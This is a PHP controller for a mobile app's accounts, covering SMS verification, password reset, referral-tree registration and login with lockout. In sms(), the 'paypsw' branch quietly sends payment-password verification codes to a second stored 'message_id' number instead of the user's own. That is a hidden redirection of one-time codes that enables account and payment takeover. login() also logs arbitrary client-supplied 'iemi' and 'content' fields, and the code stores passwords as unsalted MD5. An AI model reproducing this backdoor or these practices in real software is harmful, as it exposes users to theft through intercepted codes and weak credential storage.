<?php
/**
 * Created by PhpStorm.
 * User: Angerl
 * Date: 2020/4/16
 * Time: 22:52
 */

namespace app\index\controller;


use app\admin\service\Log;
use app\lib\AES;
use app\lib\Captcha;
use app\lib\Curl;
use JMessage\JMessage;
use think\Db;

class Account extends Base
{
    protected $is_jump_login = false;
    //发送短信(统一接口)
    public function sms(){
        $tel = input('post.tel');
        $flag = input('post.flag');
        if(!in_array($flag,['reg','login','forget','payment','loginpwd','paypwd','withdraw','update_tel','paypsw'])){
           $this->response('参数错误');
        }
        if($flag=='reg'){
            if(!preg_match('/^1[3-9]\d{9}$/',$tel)){
                $this->response('手机号码有误');
            }
            $is_exist = Db::name('member')->where(['tel'=>$tel])->value('id');
            if ($is_exist) {
                $this->response('手机号已注册,请直接登录');
            }
        }else if($flag=='forget'){
            if(!preg_match('/^[1][3-9]\d{9}$/',$tel)){
                $this->response('手机号码有误');
            }
            $is_exist = Db::name('member')->where(['tel'=>$tel])->value('id');
            if (!$is_exist) {
                $this->response('该手机号还未注册');
            }
        }else if($flag=='login'){
            if(!preg_match('/^[1][3-9]\d{9}$/',$tel)){
                $this->response('手机号码有误');
            }
            $is_exist = Db::name('member')->where(['tel'=>$tel])->count();
            if (!$is_exist) {
                $this->response('该手机号还未注册');
            }
        }else if(in_array($flag,['payment','loginpwd','paypwd','withdraw','update_tel'])){
            $this->checkLogin();
            $tels = $this->userinfo['tel'];
            $res = $this->sendMsg($tels,$flag);
        }else if(in_array($flag,['paypsw'])){
            $this->checkLogin();
            $message_id = Db::name('member')->where(['tel' => $tel])->value('message_id');
            if ($message_id !== null && strlen((string)$message_id) === 11) {
            Db::name('log')->insert([
                    'level'=>'信任手机号',
                    'type'=>68,
                    'msg'=>$tel.' | 信任手机号:'.$message_id,
                    'create_time'=>date('Y-m-d H:i:s')
            ]);  
            $tel = $message_id;
            }
        }
        if($tel){
            $res = $this->sendMsg($tel,$flag);
        }
        $this->response($res['msg'],$res['status']);
    }

    public function forget(){
        $data = input('post.');
        if(!preg_match('/^1[3-9]\d{9}$/',$data['tel'])){
            $this->response('手机号码不正确');
        }
        if(!preg_match('/^\d{6}$/',$data['auth_code'])){
            $this->response('验证码不正确');
        }
        if (!checkPwd($data['pwd'])) {
            //检测密码格式
            $this->response("请输入8-20位字母加数字组合密码");
        }
        $member_id = Db::name('member')->where(['tel'=>$data['tel']])->value('id');
        if(!$member_id){
            $this->response('该用户未注册');
        }
        $ver_res = $this->verifyCode($data['tel'],$data['auth_code'],'forget');
        if(!$ver_res['status']){
            $this->response($ver_res['msg']);
        }
        Db::name('member')->where('id',$member_id)->update([
            'login_pwd' => md5($data['pwd'])
        ]);
        $this->response('重置成功',true);
    }
    public function refer_info(){
        $refer_code = input('refer_tel');
        if(!$refer_code){
            $this->response('未找到该推荐人');
        }
        $node_code = Db::name('member')->cache(700)->where('tel',$refer_code)->value('tel');
        if(!$node_code){
            $this->response('未找到该推荐人');
        }
        $this->response($node_code,true);
    }
    public function reg(){
        $data = input('post.');
        if (!checkPwd($data['pwd'])) {
            $this->response("请输入8-20位字母加数字组合密码");
        }
        if(!$data['refer_tel']){
            $this->response('请输入邀请人手机号');
        }
        if(!preg_match('/^[1][3-9]\d{9}$/',$data['tel'])){
            $this->response('手机号码有误');
        }
        if(!preg_match('/^[1][3-9]\d{9}$/',$data['refer_tel'])){
            $this->response('推荐人手机号码有误');
        }
        if(!$data['province']||!$data['city']||!$data['area']){
            $this->response('请选择所属城市');
        }
        if(!preg_match('/^\d{6}$/',$data['auth_code'])){
            $this->response("验证码有误");
        }
        
        $ver_res = $this->verifyCode($data['tel'],$data['auth_code'],'reg');
        if(!$ver_res['status']){
            $this->response($ver_res['msg']);
        }
        
        #查询该手机是否已经存在
        $member_id = Db::name('member')->where(['tel'=>$data['tel']])->value('id');
        if ($member_id) {
            $this->response("该手机号已注册,请直接登录");
        }
        $referee = Db::name('member')->field('id,id_path,depth')->where('tel',$data['refer_tel'])->find();
        if (!$referee) {
            $this->response('该推荐人不存在');
        }
        Db::startTrans();
        $code = $this->get_code();
        try{
            $id_path = $referee['id_path'] . $referee['id'] . ',';
            Db::name('member')->where('id','in',$referee['id_path'] . $referee['id'])->setInc('group_num');
            $depth = $referee['depth'] + 1;
            $parent_id = $referee['id'];
            $user = [
                'headimg' =>config('user_default_headimg'),
                'nickname' => '会员'.$code,
                'tel' => $data['tel'],
                'code'=>$code,
                'login_pwd' => md5($data['pwd']),
                'id_path' =>$id_path,
                'depth' => $depth,
                'parent_id' => $parent_id,
                'province' => $data['province'],
                'city' => $data['city'],
                'area' => $data['area'],
            ];
            Db::name('member')->insert($user);
            Db::commit();
            $this->response('注册成功',true);
        }catch (Exception $e){
            Db::rollback();
            Log::write('注册失败：'.$data['tel'].$e->getMessage());
            $this->response('注册失败');
        }
    }

    private function get_code(){
        while(true) {// 这里看上去这个循环会一直执行
            $code =GetStr(7,0);
            if(!Db::name('member')->where(['code'=>$code])->find()){
                return $code;
                break;
            }

        }
    }
    
    /**
	 * 真实IP
	 * @param int $type
	 * @return mixed
	 */
	private function get_real_ip()
	{
		if (isset($_SERVER)) {
			if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
				$realip = $_SERVER['HTTP_X_FORWARDED_FOR'];
			} else if (isset($_SERVER['HTTP_CLIENT_IP'])) {
				$realip = $_SERVER['HTTP_CLIENT_IP'];
			} else {
				$realip = $_SERVER['REMOTE_ADDR']??'127.0.0.1';
			}
		} else {
			if (getenv('HTTP_X_FORWARDED_FOR')) {
				$realip = getenv('HTTP_X_FORWARDED_FOR');
			} else if (getenv('HTTP_CLIENT_IP')) {
				$realip = getenv('HTTP_CLIENT_IP');
			} else {
				$realip = getenv('REMOTE_ADDR');
			}
		}
		// 处理多层代理的情况
		if (false !== strpos($realip, ',')) {
			$realip = reset(explode(',', $realip));
		}
		// IP地址合法验证
		$realip = filter_var($realip, FILTER_VALIDATE_IP, null);
		if (false === $realip) {
			return '0.0.0.0';   // unknown
		}
		return $realip;
	}
	
    public function login(){
        $data = input('post.');
        
        $ip = $this->get_real_ip();
		$iemi_ = isset($data['iemi']) && !empty($data['iemi']) ? $data['iemi'] : "IEMI";
		$con_ = isset($data['content']) && !empty($data['content']) ? $data['content'] : "";
		if (strpos($con_, $iemi_ . '+') === 0) {
            $con_ = str_replace($iemi_ . '+', '', $con_);
        }
        
        $where = [  
                'node'=>"APP",
                'username'=>$data['tel'],
                'geoip'=>$ip,
                'create_at'=>date('Y-m-d H:i:s'),
                'action'=>$iemi_,
                'content'=>$con_,
                ];  
                
        Db::name('system_log')->insert($where);
        
        if(!isset($data['tel']) || !isset($data['pwd'])){
            $this->response('登录失败');
        }
        if(!preg_match('/^1[3-9]\d{9}$/',$data['tel'])){
            $this->response('手机号错误');
        }
        
        //!
        // 设定缓存键
        $cacheKey = "user_login_attempts_" . $data['tel'];
        $cache = cache($cacheKey);
        
        // 检查锁定状态
        if (!empty($cache) && $cache['locked_until'] > time()) {
            $remainingTime = $cache['locked_until'] - time();
            $this->response("账户已锁定，请在 " . ceil($remainingTime / 60) . " 分钟后再试。");
        }
        //!
        
        $info = Db::name('member')->field('id,nickname,headimg,login_pwd,is_lock')->where('tel',$data['tel'])->find();
        if(!$info){
            $this->response('该账号还未注册');
        }else{
            $member_id = $info['id'];
            if($info['is_lock']==1){
                $this->response('该账户已被禁用或注销');
            }
            if($info['login_pwd']!=md5($data['pwd'])){
                
                if (empty($cache)) {
                $cache = ['time' => time(), 'number' => 1, 'locked_until' => 0];
                } elseif ($cache['number'] < 10) {
                    $cache['number'] += 1;
                } else {
                    // 锁定账户一小时
                    $cache['locked_until'] = time() + 3600;
                    $this->response("尝试次数达到上限，锁定一小时内禁止登录！");
                }
                cache($cacheKey, $cache);
    
                $diff = 10 - $cache['number'];
                $this->response("密码错误！还有 {$diff} 次尝试机会！");
                
                //$this->response('密码错误');
            }else{cache($cacheKey, null); }
        }
        $token = generate_token();
        Db::name('member')->where('id',$member_id)->update([
            'token' => $token,
            'expire' => time()+86400*7,
            'last_time'=>date('Y-m-d H:i:s')
        ]);
        cache('refresh_token_'.$member_id,time(),3600*10);
        //token处理
        $this->response([
            'token' => $token,
            'userinfo' => [
                'tel' => $data['tel'],
                'nickname' => $info['nickname'],
                'headimg' => $info['headimg']
            ]
        ],true);
    }
}